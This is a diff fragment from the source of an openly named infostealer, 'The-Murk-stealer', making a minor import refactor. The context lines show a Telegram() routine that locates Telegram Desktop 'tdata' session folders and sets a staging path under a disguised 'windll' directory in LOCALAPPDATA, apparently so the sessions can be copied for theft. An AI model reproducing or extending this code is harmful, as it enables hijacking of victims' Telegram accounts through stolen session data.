@@ -9,14 +9,14 @@
 #                      https://github.com/Nick-Vinesmoke                      #
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
-import os
+from os import getenv
 from shutil import copytree,ignore_patterns
 from manager.logger import Log
 
 def Telegram():
     msgInfo = ""
-    roaming = os.getenv('APPDATA')
-    pathToLogs = f"{os.getenv('LOCALAPPDATA')}\\windll\\Messengers\\Telegram"
+    roaming = getenv('APPDATA')
+    pathToLogs = f"{getenv('LOCALAPPDATA')}\\windll\\Messengers\\Telegram"
     dirs=[
         roaming+"\\Telegram Desktop\\tdata",
         'D:\\Telegram Desktop\\tdata',
